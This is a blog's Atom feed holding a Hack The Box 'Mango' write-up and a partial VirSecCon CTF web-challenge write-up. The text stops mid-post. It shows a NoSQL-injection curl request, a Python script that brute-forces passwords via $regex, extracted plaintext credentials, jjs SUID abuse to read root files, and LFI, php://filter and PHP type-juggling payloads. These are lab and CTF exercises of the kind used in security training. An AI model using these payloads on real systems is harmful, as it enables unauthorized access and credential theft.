<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-19T00:39:14+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box: Mango</title><link href="http://localhost:4000/2020/04/18/htb-mango.html" rel="alternate" type="text/html" title="Hack The Box: Mango" /><published>2020-04-18T00:00:00+05:45</published><updated>2020-04-18T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/18/htb-mango</id><content type="html" xml:base="http://localhost:4000/2020/04/18/htb-mango.html">&lt;h1 id=&quot;htbmango&quot;&gt;HTB:Mango&lt;/h1&gt;

&lt;p&gt;Mango box was the medium box. It falls under linux and medium category. Especially to get user flag was a quite difficult one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by generating the username and password of &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;user of mongodb. For root, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;jjs&lt;/code&gt; command line tool to access the root.txt file. I’ll show all my payload(including that didn’t work in initial deployment to get the root).&lt;/p&gt;

&lt;h1 id=&quot;box-details&quot;&gt;Box Details&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/mango_details.png&quot; alt=&quot;mango_details&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In above picture IP was 10.10.10.162 and added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as mango.htb. Let’s solve this box.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;

&lt;p&gt;Let’s start with our universal port scanner, nmap to see the open port and ports &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH(22)&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP(80)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP(443)&lt;/code&gt; are opened.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Jan 21 22:10:40 2020 as: nmap -sS -sC -sV -Pn -oN nmap.txt 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;mango.htb&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As soon as I saw port 80 opened I visited the site and got output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/mango_http.jpg&quot; alt=&quot;mango_http&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So seems like this site wasn’t allowed to visit so I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; of that and got a platform which was alike as google.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/mango_https.jpg&quot; alt=&quot;mango_https&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then I looked everypart of the website and got nothing useful but when I checked for certificate of that website and got &lt;code class=&quot;highlighter-rouge&quot;&gt;staging-order.mango.htb&lt;/code&gt; as new domain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/staging_mango.png&quot; alt=&quot;staging_certificate&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so I added that to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and on visiting that domain I found a login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/login_page_mango.jpg&quot; alt=&quot;login_page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Everytime when I find login page I will try SQL Injection. But here box name suggest mango so database was &lt;code class=&quot;highlighter-rouge&quot;&gt;mongodb&lt;/code&gt;. To understand more about mongodb visit &lt;a href=&quot;https://medium.com/better-programming/little-bobby-collections-how-to-write-a-mongodb-injection-ad58a4e2d754&quot;&gt;here&lt;/a&gt;. Payload for mongodb requires Nosql Injection. After a lot of search I found an interesting git repo where I got the payload for Nosqli. You can find it &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now I injected NoSql Payload [$ne] in password field and it was vulnerable to NoSqli as I was redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home.php&lt;/code&gt; page i.e 302 error.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr41n73:~# curl -i -X POST http://staging-order.mango.htb/ -d &quot;username=mango&amp;amp;password[\$ne]=^&quot; -s -o /dev/null -v
......
&amp;lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&amp;lt; Cache-Control: no-store, no-cache, must-revalidate
&amp;lt; Pragma: no-cache
&amp;lt; location: home.php
&amp;lt; Content-Length: 4022
&amp;lt; Content-Type: text/html; charset=UTF-8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So I found the vulnerable point so I made a simple script with NoSql repo as&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Script:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import requests
import string

username = 'mango'
password = ''
url = &quot;http://staging-order.mango.htb/&quot;
restart = True
headers={'content-type': 'application/json'}

while restart:
        restart = False

        for character in string.printable:
            if character not in ['*', '+', '.', '?', '|']:
                payload = password + character
                post_data = {'username':username, 'password[$regex]':&quot;^&quot; + payload, 'login':'login'}
                r = requests.post(url, data=post_data, allow_redirects=False)

                if r.status_code == 302:
                    print(payload)
                    restart = True
                    password = payload

                    if len(password) == 16:
                        print(&quot;\nMango password: &quot; + payload)

                        exit(0)
                    break
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This way I got the password as &lt;code class=&quot;highlighter-rouge&quot;&gt;h3mXK8RhU~f{]f5H&lt;/code&gt; which was of &lt;code class=&quot;highlighter-rouge&quot;&gt;mango&lt;/code&gt; user.&lt;/p&gt;

&lt;h2 id=&quot;unprivileged-user-to-privileged-user&quot;&gt;Unprivileged User to Privileged User&lt;/h2&gt;

&lt;p&gt;Now I tried ssh into mango user with that creds I got mango shell.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr41n73:~# ssh mango@mango.htb
The authenticity of host 'mango.htb (10.10.10.162)' can't be established.                                                                             
ECDSA key fingerprint is SHA256:AhHG3k5r1ic/7nEKLWHXoNm0m28uM9W8heddb9lCTm0.                                                                          
Are you sure you want to continue connecting (yes/no/[fingerprint])? uyes                                                                             
Please type 'yes', 'no' or the fingerprint: yes                                                                                                       
Warning: Permanently added 'mango.htb' (ECDSA) to the list of known hosts.                                                                            
mango@mango.htb's password:                                                                                                                           
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)                                                                                    
                                                                                                                                                      
 * Documentation:  https://help.ubuntu.com                                                                                                            
 * Management:     https://landscape.canonical.com                                                                                                    
 * Support:        https://ubuntu.com/advantage                                                                                                       
                                                                                                                                                      
  System information as of Sat Apr 18 09:22:51 UTC 2020                                                                                               
                                                                                                                                                      
  System load:  0.0                Processes:            99
  Usage of /:   25.9% of 19.56GB   Users logged in:      0
  Memory usage: 14%                IP address for ens33: 10.10.10.162
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Apr 18 07:55:54 2020 from 10.10.14.9
mango@mango:~$ whoami
mango
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Then I searched everypart of the shell but nothing was found over there so only thing I remind was the mongodb so I used it.&lt;/p&gt;

&lt;h4 id=&quot;creds-extraction-mongodb&quot;&gt;Creds Extraction [Mongodb]&lt;/h4&gt;
&lt;p&gt;Now to get the other users creds I searched mongo database with commands.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; show dbs
admin   0.000GB
config  0.000GB
local   0.000GB
mango   0.000GB
&amp;gt; use mango
switched to db mango
&amp;gt; show tables
users
&amp;gt; db.getCollection(&quot;users&quot;).find()
{ &quot;_id&quot; : ObjectId(&quot;5d8e25334f3bf1432628927b&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;t9KcS3&amp;gt;!0B#2&quot; }
{ &quot;_id&quot; : ObjectId(&quot;5d8e25364f3bf1432628927c&quot;), &quot;username&quot; : &quot;mango&quot;, &quot;password&quot; : &quot;h3mXK8RhU~f{]f5H&quot; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After using &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;/&lt;code class=&quot;highlighter-rouge&quot;&gt;t9KcS3&amp;gt;!0B#2&lt;/code&gt; user/password. I got the user shell and flag.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# su admin
Password:
$ python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;.
See &quot;man sudo_root&quot; for details.

admin@mango:/home/admin$ whoami
admin
admin@mango:/home/admin$ cat user.txt
79bf31c*********************
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;

&lt;p&gt;Now for root part I upload a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;admin@mango&lt;/code&gt;  machine and run the script. After I lot of searched in the output of that script I found &lt;code class=&quot;highlighter-rouge&quot;&gt;SUID&lt;/code&gt; files owned by user &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@mango:/home/admin$ ./LinEnum.sh
[-] SGID files:                                                                                                                                       
.........
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jjs&lt;/code&gt; tool was owned by user &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; as it was a tool which is used to invoke the Nashorn engine. You can find detail &lt;a href=&quot;https://docs.oracle.com/en/java/javase/11/tools/jjs.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;And for exploit I usually search in &lt;a href=&quot;https://gtfobins.github.io/gtfobins/jjs/&quot;&gt;gtfobins.io&lt;/a&gt;. and I got the exploit for tool &lt;code class=&quot;highlighter-rouge&quot;&gt;jjs&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;jjs-commands&quot;&gt;jjs Commands&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@mango:/home/admin/$ echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReeader&quot;);
&amp;gt; ^C
eader&quot;);ngo:/home/admin$ echo 'var BufferedReader = Java.type(&quot;java.io.BufferedRe
jjs&amp;gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);
jjs&amp;gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);
jjs&amp;gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));
jjs&amp;gt; while ((line = br.readLine()) != null) { print(line); }
8a8ef********************
jjs&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This way I got the root of &lt;code class=&quot;highlighter-rouge&quot;&gt;mango&lt;/code&gt; box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;MrR3boot&lt;/code&gt; for such an awesome box.&lt;/p&gt;

&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;/p&gt;

&lt;p&gt;Feedback are really appreciated !!&lt;/p&gt;

&lt;p&gt;Tweet about this writeup if you like.&lt;/p&gt;

&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="mongodb" /><category term="jjs" /><category term="Nosql" /><summary type="html">HTB:Mango</summary></entry><entry><title type="html">VirSecCon CTF: Web Challenges</title><link href="http://localhost:4000/2020/04/17/virseccon-ctf-web.html" rel="alternate" type="text/html" title=" VirSecCon CTF: Web Challenges" /><published>2020-04-17T00:00:00+05:45</published><updated>2020-04-17T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/17/virseccon-ctf-web</id><content type="html" xml:base="http://localhost:4000/2020/04/17/virseccon-ctf-web.html">&lt;h2 id=&quot;web-challenges&quot;&gt;Web Challenges&lt;/h2&gt;

&lt;p&gt;Web challenge was related to the Php, Server Side Template Injection(SSTI), SQL vulnerability, Jwt etc..&lt;/p&gt;

&lt;h3 id=&quot;1-countdown&quot;&gt;1. Countdown&lt;/h3&gt;
&lt;h4 id=&quot;description-60&quot;&gt;Description [60]&lt;/h4&gt;
&lt;p&gt;We hear something beeping… is there something in the oven?&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50036.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As I visited the site there was nothing in source-code except &lt;code class=&quot;highlighter-rouge&quot;&gt;defuse.php&lt;/code&gt; so I fired my burp-suite and intercepted and got &lt;code class=&quot;highlighter-rouge&quot;&gt;detonate_time&lt;/code&gt; cookie as &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;Cookie: detonate_time=1587109772 &lt;/code&gt;
and changed it more than it was &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;Cookie: detonate_time=99999999999999999999999999&lt;/code&gt;
this way I got the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/countdown_flag_virseccon.jpg&quot; alt=&quot;countdown_flag&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-hot-access&quot;&gt;2. Hot Access&lt;/h3&gt;
&lt;h4 id=&quot;description-70&quot;&gt;Description [70]&lt;/h4&gt;
&lt;p&gt;Access to all the latest modules, hot off the press! What can you access?&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50016&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As the challenge name was &lt;code class=&quot;highlighter-rouge&quot;&gt;hotaccess&lt;/code&gt; and it was using a simple php module with resources from apache web server. So I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;date&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;time&lt;/code&gt;  got the new paramter
&lt;code class=&quot;highlighter-rouge&quot;&gt;http://jh2i.com:50016/?m=modules/date.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now I accessed &lt;code class=&quot;highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;?m=.htaccess&lt;/code&gt; which was a default file created by apache in every webserver and got output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/htaccess_virseccon.jpg&quot; alt=&quot;.htaccess&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On viewing-source code I got &lt;code class=&quot;highlighter-rouge&quot;&gt;sshh_don_tell_i_hid_the_flag_here&lt;/code&gt; dir.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sshh_dont_tell_i_hid_the_flag_here&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	
	AllowOverride All
 
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and visited that dir as 
&lt;code class=&quot;highlighter-rouge&quot;&gt;?m=sshh_dont_tell_i_hid_the_flag_here/flag.txt&lt;/code&gt;. Then I finally got the flag with 70 points.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{htaccess_can_control_what_you_access}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;3-magician&quot;&gt;3. Magician&lt;/h3&gt;
&lt;h4 id=&quot;description-80&quot;&gt;Description [80]&lt;/h4&gt;
&lt;p&gt;Show me a hat trick!&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50000&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- Challenge presents a hash in home page &lt;code class=&quot;highlighter-rouge&quot;&gt;==0e953532678923638053842468642408&lt;/code&gt;. So I tried with md5 decrypt but failed then I looked over the challenge name word ‘Magic Hash’ and got this github repo which was quite interesting one.
&lt;a href=&quot;https://github.com/spaze/hashes/blob/master/md5.md&quot;&gt;https://github.com/spaze/hashes/blob/master/md5.md&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Entering any string of that hash I got the flag.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{magic_hashes_make_for_a_good_show} &lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;4-phpjuggler&quot;&gt;4. PHPJuggler&lt;/h3&gt;
&lt;h4 id=&quot;decription-80&quot;&gt;Decription [80]&lt;/h4&gt;
&lt;p&gt;PHP is here to entertain again! They’ve shown you magic tricks, disappearing acts, and now… juggling!&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50030.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As I visited the site and found a php code which was working in backend.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'flag.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;You got it! That's the correct flag! &amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;NOPE! Wrong flag.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nb&quot;&gt;highlight_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here I found &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp()&lt;/code&gt; function which compares the strings and that function willn’t handle the array. So I fired my burp-suite and send parameter as an array. This way I got the flag .&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;flag=fsd&lt;/code&gt; =» &lt;code class=&quot;highlighter-rouge&quot;&gt;flag[]=fsd&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 6
You got it! That's the correct flag!
LLS{php_dropped_the_ball_again}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;5-glhf&quot;&gt;5. GLHF&lt;/h3&gt;
&lt;h4 id=&quot;description-90&quot;&gt;Description [90]&lt;/h4&gt;
&lt;p&gt;LMFAO! FLAG PLZ, THX!&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50014&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- After visiting the challenge I got many urls and I noticed &lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG&lt;/code&gt; and submit it as&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;/index.php?page=FLAG&lt;/code&gt;
and got&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; FLAG????
WTF, PLZ??? 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;On viewing source I got&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &amp;lt;!-- SRY PHP LFI NBD --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So I php was vulnerable to LFI I brute forced with the wordlist of LFI and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;php://filter/convert.base64-encode/resource=FLAG&lt;/code&gt; as lfi injection point. You can visit here for more &lt;a href=&quot;https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf&quot;&gt;Juggling tricks&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg==
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I tried to decode this and got the flag.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
